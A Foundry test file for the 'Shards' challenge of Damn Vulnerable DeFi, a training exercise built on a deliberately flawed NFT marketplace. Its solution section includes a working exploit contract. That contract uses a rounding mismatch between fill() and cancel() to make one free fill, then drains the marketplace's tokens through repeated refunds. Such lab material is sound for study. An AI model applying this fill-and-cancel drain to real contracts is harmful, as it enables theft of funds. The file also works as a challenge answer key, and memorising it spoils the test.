// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {
    ShardsNFTMarketplace,
    IShardsNFTMarketplace,
    ShardsFeeVault,
    DamnValuableToken,
    DamnValuableNFT
} from "../../src/shards/ShardsNFTMarketplace.sol";
import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";

contract ShardsChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address seller = makeAddr("seller");
    address oracle = makeAddr("oracle");
    address recovery = makeAddr("recovery");

    uint256 constant STAKING_REWARDS = 100_000e18;
    uint256 constant NFT_SUPPLY = 50;
    uint256 constant SELLER_NFT_BALANCE = 1;
    uint256 constant SELLER_DVT_BALANCE = 75e19;
    uint256 constant STAKING_RATE = 1e18;
    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    DamnValuableToken token;
    DamnValuableNFT nft;
    ShardsFeeVault feeVault;
    ShardsNFTMarketplace marketplace;
    DamnValuableStaking staking;

    uint256 initialTokensInMarketplace;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy NFT contract and mint initial supply
        nft = new DamnValuableNFT();
        for (uint256 i = 0; i < NFT_SUPPLY; i++) {
            if (i < SELLER_NFT_BALANCE) {
                nft.safeMint(seller);
            } else {
                nft.safeMint(deployer);
            }
        }

        // Deploy token (used for payments and fees)
        token = new DamnValuableToken();

        // Deploy NFT marketplace and get the associated fee vault
        marketplace =
            new ShardsNFTMarketplace(nft, token, address(new ShardsFeeVault()), oracle, MARKETPLACE_INITIAL_RATE);
        feeVault = marketplace.feeVault();

        // Deploy DVT staking contract and enable staking of fees in marketplace
        staking = new DamnValuableStaking(token, STAKING_RATE);
        token.transfer(address(staking), STAKING_REWARDS);
        marketplace.feeVault().enableStaking(staking);

        // Fund seller with DVT (to cover fees)
        token.transfer(seller, SELLER_DVT_BALANCE);

        // Seller opens offers in the marketplace
        vm.startPrank(seller);
        token.approve(address(marketplace), SELLER_DVT_BALANCE); // for fees
        nft.setApprovalForAll(address(marketplace), true);
        for (uint256 id = 0; id < SELLER_NFT_BALANCE; id++) {
            marketplace.openOffer({nftId: id, totalShards: NFT_OFFER_SHARDS, price: NFT_OFFER_PRICE});
        }

        initialTokensInMarketplace = token.balanceOf(address(marketplace));

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(feeVault.owner(), deployer);
        assertEq(address(feeVault.token()), address(token));
        assertEq(address(feeVault.staking()), address(staking));

        assertEq(nft.balanceOf(deployer), NFT_SUPPLY - SELLER_NFT_BALANCE);
        assertEq(nft.balanceOf(address(marketplace)), marketplace.offerCount());
        assertEq(marketplace.offerCount(), SELLER_NFT_BALANCE);
        assertEq(marketplace.rate(), MARKETPLACE_INITIAL_RATE);
        assertGt(marketplace.feesInBalance(), 0);
        assertEq(token.balanceOf(address(marketplace)), marketplace.feesInBalance());

        assertEq(staking.rate(), STAKING_RATE);
        assertEq(staking.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS);
        assertEq(token.balanceOf(address(feeVault)), 0);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_shards() public checkSolvedByPlayer {
        // Aegis sweep -> SC07 precision: fill() cost = want*_toDVT(price,rate)/totalShards (rounds
        // DOWN -> 0 for tiny want), but cancel() refunds want*rate/1e6 WITHOUT the /totalShards. So a
        // free fill seeds DVT, then a sized fill drains the whole marketplace via the refund. One tx.
        new ShardsAttacker(marketplace, token, 1, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Balance of staking contract didn't change
        assertEq(token.balanceOf(address(staking)), STAKING_REWARDS, "Not enough tokens in staking rewards");

        // Marketplace has less tokens
        uint256 missingTokens = initialTokensInMarketplace - token.balanceOf(address(marketplace));
        assertGt(missingTokens, initialTokensInMarketplace * 1e16 / 100e18, "Marketplace still has tokens");

        // All recovered funds sent to recovery account
        assertEq(token.balanceOf(recovery), missingTokens, "Not enough tokens in recovery account");
        assertEq(token.balanceOf(player), 0, "Player still has tokens");

        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1);
    }
}

contract ShardsAttacker {
    constructor(ShardsNFTMarketplace m, DamnValuableToken token, uint64 offerId, address recovery) {
        token.approve(address(m), type(uint256).max);

        // cycle 1: free fill (cost rounds to 0) -> cancel for a seed refund (want * rate/1e6)
        uint256 i1 = m.fill(offerId, 132);
        m.cancel(offerId, i1);

        // cycle 2: fill enough that the refund equals the marketplace's balance -> drains it
        uint256 want = token.balanceOf(address(m)) / (75e15 / 1e6); // refund == want * rate/1e6
        uint256 i2 = m.fill(offerId, want);
        m.cancel(offerId, i2);

        token.transfer(recovery, token.balanceOf(address(this)));
    }
}
